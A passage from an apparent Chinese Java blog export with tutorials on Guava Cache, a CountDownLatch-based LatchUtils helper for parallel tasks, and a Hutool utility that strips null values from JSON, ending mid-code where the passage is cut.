<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>33.4.8-jre<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> com.google.common.cache.*;</span><br><span class="line"><span class="keyword">import</span> io.vavr.collection.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GuavaCacheDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException &#123;</span><br><span class="line">        basicUsageDemo();</span><br><span class="line">        loadingCacheDemo();</span><br><span class="line">        cacheRemovalListenerDemo();</span><br><span class="line">        cacheStatisticsDemo();</span><br><span class="line">        advancedEvictionDemo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 基础缓存操作示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basicUsageDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 1. 基础缓存操作 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().expireAfterWrite(<span class="number">5</span>, TimeUnit.SECONDS) <span class="comment">// 写入5秒后过期</span></span><br><span class="line">            .maximumSize(<span class="number">100</span>) <span class="comment">// 最大100个条目</span></span><br><span class="line">            .concurrencyLevel(<span class="number">4</span>) <span class="comment">// 并发级别</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动写入</span></span><br><span class="line">        cache.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取值（不存在返回null）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取key1: &quot;</span> + value); <span class="comment">// 输出: value1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试获取不存在的key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value2</span> <span class="operator">=</span> cache.getIfPresent(<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;获取不存在的key2: &quot;</span> + value2); <span class="comment">// 输出: null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动加载缓存示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadingCacheDemo</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 2. 自动加载缓存 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder().expireAfterAccess(<span class="number">3</span>, TimeUnit.SECONDS) <span class="comment">// 3秒未访问则过期</span></span><br><span class="line">            .maximumSize(<span class="number">10</span>).build(<span class="keyword">new</span> <span class="title class_">CacheLoader</span>&lt;String, String&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">load</span><span class="params">(String key)</span> &#123;</span><br><span class="line">                    <span class="comment">// 模拟从数据库加载</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;正在加载: &quot;</span> + key);</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;db-value-&quot;</span> + key;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动触发加载函数</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 输出: db-value-user1001</span></span><br><span class="line">        System.out.println(cache.get(<span class="string">&quot;user1001&quot;</span>)); <span class="comment">// 第二次直接从缓存获取</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 批量获取</span></span><br><span class="line">        System.out.println(cache.getAll(List.of(<span class="string">&quot;user1002&quot;</span>, <span class="string">&quot;user1003&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存淘汰监听器示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cacheRemovalListenerDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 3. 淘汰监听器 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RemovalListener&lt;String, String&gt; listener = notification -&gt; &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;淘汰事件: key=%s, value=%s, 原因=%s\n&quot;</span>, notification.getKey(), notification.getValue(),</span><br><span class="line">                notification.getCause());</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().maximumSize(<span class="number">3</span>) <span class="comment">// 测试用的小容量</span></span><br><span class="line">            .removalListener(listener).build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k2&quot;</span>, <span class="string">&quot;v2&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k3&quot;</span>, <span class="string">&quot;v3&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;k4&quot;</span>, <span class="string">&quot;v4&quot;</span>); <span class="comment">// 触发淘汰（LRU）</span></span><br><span class="line"></span><br><span class="line">        cache.invalidate(<span class="string">&quot;k2&quot;</span>); <span class="comment">// 手动触发淘汰</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存统计示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cacheStatisticsDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 4. 缓存统计 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder().maximumSize(<span class="number">100</span>).recordStats() <span class="comment">// 开启统计</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;k1&quot;</span>);</span><br><span class="line">        cache.getIfPresent(<span class="string">&quot;missingKey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CacheStats</span> <span class="variable">stats</span> <span class="operator">=</span> cache.stats();</span><br><span class="line">        System.out.println(<span class="string">&quot;命中率: &quot;</span> + stats.hitRate()); <span class="comment">// 输出: 0.5</span></span><br><span class="line">        System.out.println(<span class="string">&quot;命中数: &quot;</span> + stats.hitCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;未命中数: &quot;</span> + stats.missCount()); <span class="comment">// 输出: 1</span></span><br><span class="line">        System.out.println(<span class="string">&quot;加载成功数: &quot;</span> + stats.loadSuccessCount());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 高级淘汰策略示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">advancedEvictionDemo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\n=== 5. 高级淘汰策略 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Cache&lt;String, String&gt; cache = CacheBuilder.newBuilder()</span><br><span class="line">            <span class="comment">// 基于权重的淘汰（假设不同value占用不同空间）</span></span><br><span class="line">            .maximumWeight(<span class="number">1000</span>).weigher((String key, String value) -&gt; value.length())</span><br><span class="line">            <span class="comment">// 弱引用key和value（适合缓存大对象）</span></span><br><span class="line">            .weakKeys().weakValues()</span><br><span class="line">            <span class="comment">// 定期维护（减少并发开销）</span></span><br><span class="line">            .concurrencyLevel(<span class="number">8</span>).build();</span><br><span class="line"></span><br><span class="line">        cache.put(<span class="string">&quot;long&quot;</span>, <span class="string">&quot;这是一个很长的字符串值&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;short&quot;</span>, <span class="string">&quot;小&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;当前大小: &quot;</span> + cache.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能五【自定义异步任务工具类LatchUtils】</title>
    <url>/cnblogs.github.io/p/feb0.html</url>
    <content><![CDATA[<p>在Java应用开发中，我们经常需要将一些任务进行异步并行处理。当主流程需要等待所有任务执行完毕后再继续时，这就会用到 CountDownLatch 等并发工具类。然而，直接使用这些原生工具类，往往意味着需要编写一些重复的、模式化的“胶水代码”，这不仅增加了代码量，也让核心业务逻辑显得不够清晰。我封装了一个名为 LatchUtils 的轻量级工具类。它能够以一种极其简洁的方式来组织和管理这一类异步任务。</p>
<p><strong>详细代码</strong><br>先上代码，后面会有使用说明和示例以及和传统实现代码的对比</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LatchUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;List&lt;TaskInfo&gt;&gt; THREADLOCAL = ThreadLocal.withInitial(LinkedList::<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">submitTask</span><span class="params">(Executor executor, Runnable runnable)</span> &#123;</span><br><span class="line">        THREADLOCAL.get().add(<span class="keyword">new</span> <span class="title class_">TaskInfo</span>(executor, runnable));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;TaskInfo&gt; <span class="title function_">popTask</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;TaskInfo&gt; taskInfos = THREADLOCAL.get();</span><br><span class="line">        THREADLOCAL.remove();</span><br><span class="line">        <span class="keyword">return</span> taskInfos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">waitFor</span><span class="params">(<span class="type">long</span> timeout, TimeUnit timeUnit)</span> &#123;</span><br><span class="line">        List&lt;TaskInfo&gt; taskInfos = popTask();</span><br><span class="line">        <span class="keyword">if</span> (taskInfos.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(taskInfos.size());</span><br><span class="line">        <span class="keyword">for</span> (TaskInfo taskInfo : taskInfos) &#123;</span><br><span class="line">            <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> taskInfo.executor;</span><br><span class="line">            <span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> taskInfo.runnable;</span><br><span class="line">            executor.execute(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    runnable.run();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    latch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">await</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            await = latch.await(timeout, timeUnit);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> await;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TaskInfo</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Executor executor;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Runnable runnable;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TaskInfo</span><span class="params">(Executor executor, Runnable runnable)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.executor = executor;</span><br><span class="line">            <span class="built_in">this</span>.runnable = runnable;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用说明</strong><br>只需如下两步即可。</p>
<ul>
<li>提交任务: 在主流程代码，先调用 LatchUtils.submitTask() 提交Runnable任务和其对应的Executor（用来执行这个Runnable）。</li>
<li>执行并等待: 当并行任务都提交完毕后，只需调用一次 LatchUtils.waitFor()。该方法会立即触发所有已注册任务执行，并阻塞等待所有任务执行完成或超时。</li>
</ul>
<p><strong>实战示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	LatchUtils.submitTask(executorService, () -&gt; &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Task 1 started.&quot;</span>);</span><br><span class="line">		<span class="comment">// Simulate some work</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Task 1 completed.&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	LatchUtils.submitTask(executorService, () -&gt; &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Task 2 started.&quot;</span>);</span><br><span class="line">		<span class="comment">// Simulate some work</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Task 2 completed.&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	LatchUtils.submitTask(executorService, () -&gt; &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Task 3 started.&quot;</span>);</span><br><span class="line">		<span class="comment">// Simulate some work</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Task 3 completed.&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="type">boolean</span> <span class="variable">waitFor</span> <span class="operator">=</span> LatchUtils.waitFor(<span class="number">5</span>, TimeUnit.SECONDS);</span><br><span class="line">	<span class="keyword">if</span> (waitFor) &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;All tasks completed within the specified time.&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Some tasks may not have completed.&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>从这个例子中可以看到，业务代码变得非常清晰。我们只需要关注“提交任务”和“等待结果”这两个动作，而无需关心 CountDownLatch 的初始化、countDown() 的调用等细节。<br><strong>对比：不使用 LatchUtils</strong><br>为了更好地理解 LatchUtils 带来的价值，让我们用传统的Java并发API实现与上面完全相同的功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line">	<span class="type">CountDownLatch</span> <span class="variable">latch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">3</span>);</span><br><span class="line">	executorService.execute(() -&gt; &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;Task 1 started.&quot;</span>);</span><br><span class="line">			<span class="comment">// Simulate some work</span></span><br><span class="line">			System.out.println(<span class="string">&quot;Task 1 completed.&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			latch.countDown();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	executorService.execute(() -&gt; &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;Task 2 started.&quot;</span>);</span><br><span class="line">			<span class="comment">// Simulate some work</span></span><br><span class="line">			System.out.println(<span class="string">&quot;Task 2 completed.&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			latch.countDown();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	executorService.execute(() -&gt; &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;Task 3 started.&quot;</span>);</span><br><span class="line">			<span class="comment">// Simulate some work</span></span><br><span class="line">			System.out.println(<span class="string">&quot;Task 3 completed.&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			latch.countDown();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="type">boolean</span> <span class="variable">await</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		await = latch.await(<span class="number">5</span>, TimeUnit.SECONDS);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (await) &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;All tasks completed within the specified time.&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Some tasks may not have completed.&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能六【Hutool-JSONUtil巧妙过滤Null值】</title>
    <url>/cnblogs.github.io/p/2e47.html</url>
    <content><![CDATA[<p><strong>Maven依赖配置</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.8.22<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>核心过滤工具类实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSON null值过滤工具类</span></span><br><span class="line"><span class="comment"> * 注意：本工具类仅供学习参考，生产环境请根据实际需求调整</span></span><br><span class="line"><span class="comment"> * 安全提示：请确保输入的JSON数据来源可信，避免恶意数据注入</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonNullFilterUtil</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将JSON字符串转换为Map，同时过滤掉value为null的键值对</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jsonString JSON字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 过滤后的Map对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">toMapWithoutNull</span><span class="params">(String jsonString)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (jsonString == <span class="literal">null</span> || jsonString.trim().isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(jsonString);</span><br><span class="line">            <span class="keyword">return</span> filterNullValues(jsonObject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 安全提示：生产环境中应该使用日志框架记录异常</span></span><br><span class="line">            System.err.println(<span class="string">&quot;JSON解析失败: &quot;</span> + e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归过滤JSONObject中的null值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jsonObject 原始JSONObject</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 过滤后的Map</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">filterNullValues</span><span class="params">(JSONObject jsonObject)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; resultMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : jsonObject.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 跳过null值</span></span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 递归处理嵌套对象</span></span><br><span class="line">            <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">                Map&lt;String, Object&gt; nestedMap = filterNullValues((JSONObject) value);</span><br><span class="line">                <span class="keyword">if</span> (!nestedMap.isEmpty()) &#123;</span><br><span class="line">                    resultMap.put(key, nestedMap);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 处理数组类型</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONArray) &#123;</span><br><span class="line">                List&lt;Object&gt; filteredList = filterNullValuesInArray((JSONArray) value);</span><br><span class="line">                <span class="keyword">if</span> (!filteredList.isEmpty()) &#123;</span><br><span class="line">                    resultMap.put(key, filteredList);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 处理基础类型（非null值）</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                resultMap.put(key, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> resultMap;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤JSONArray中的null值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jsonArray 原始JSONArray</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 过滤后的List</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title function_">filterNullValuesInArray</span><span class="params">(JSONArray jsonArray)</span> &#123;</span><br><span class="line">        List&lt;Object&gt; resultList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Object item : jsonArray) &#123;</span><br><span class="line">            <span class="keyword">if</span> (item == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (item <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">                Map&lt;String, Object&gt; filteredMap = filterNullValues((JSONObject) item);</span><br><span class="line">                <span class="keyword">if</span> (!filteredMap.isEmpty()) &#123;</span><br><span class="line">                    resultList.add(filteredMap);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item <span class="keyword">instanceof</span> JSONArray) &#123;</span><br><span class="line">                List&lt;Object&gt; filteredNestedList = filterNullValuesInArray((JSONArray) item);</span><br><span class="line">                <span class="keyword">if</span> (!filteredNestedList.isEmpty()) &#123;</span><br><span class="line">                    resultList.add(filteredNestedList);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultList.add(item);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> resultList;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取过滤统计信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> originalJson 原始JSON字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 过滤统计信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> FilterStatistics <span class="title function_">getFilterStatistics</span><span class="params">(String originalJson)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (originalJson == <span class="literal">null</span> || originalJson.trim().isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FilterStatistics</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">original</span> <span class="operator">=</span> JSONUtil.parseObj(originalJson);</span><br><span class="line">        Map&lt;String, Object&gt; filtered = toMapWithoutNull(originalJson);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">originalCount</span> <span class="operator">=</span> countTotalFields(original);</span><br><span class="line">        <span class="type">int</span> <span class="variable">filteredCount</span> <span class="operator">=</span> countTotalFields(filtered);</span><br><span class="line">        <span class="type">int</span> <span class="variable">removedCount</span> <span class="operator">=</span> originalCount - filteredCount;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FilterStatistics</span>(originalCount, filteredCount, removedCount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归统计字段总数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">countTotalFields</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObj</span> <span class="operator">=</span> (JSONObject) obj;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> jsonObj.size();</span><br><span class="line">            <span 